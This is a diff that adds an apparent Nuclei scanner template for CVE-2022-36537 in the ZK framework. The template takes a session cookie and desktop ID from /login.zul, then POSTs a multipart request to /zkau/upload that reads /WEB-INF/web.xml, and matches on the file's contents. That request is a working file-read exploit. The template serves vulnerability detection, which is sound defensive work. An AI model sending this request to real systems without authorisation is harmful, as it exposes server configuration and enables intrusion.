@@ -1,0 +1,62 @@
+id: zkoss-zk-framework-information-disclosure
+info:
+  name: Zkoss Zk_framework Information Disclosure Vulnerability (CVE-2022-36537)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2022-36537
+
+variables:
+  cookie: ""
+  dtid: ""
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: fetch-session
+    method: GET
+    path:
+      - "{{BaseURL}}/login.zul"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - "JSESSIONID=([a-zA-Z0-9]+)"
+      - type: regex
+        name: dtid
+        internal: true
+        part: body
+        regex:
+          - "z_([^,']+)"
+
+  - id: attempt-file-read
+    method: POST
+    path:
+      - "{{BaseURL}}/zkau/upload?uuid=101010&dtid={{dtid}}&sid=0&maxsize=-1"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryCs6yB0zvpfSBbYEp"
+      Cookie: "JSESSIONID={{cookie}}"
+    body: |
+      ------WebKitFormBoundaryCs6yB0zvpfSBbYEp
+      Content-Disposition: form-data; name="nextURI"
+
+      /WEB-INF/web.xml
+      ------WebKitFormBoundaryCs6yB0zvpfSBbYEp--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<display-name>"
+          - "<welcome-file-list>"
+          - "xml"
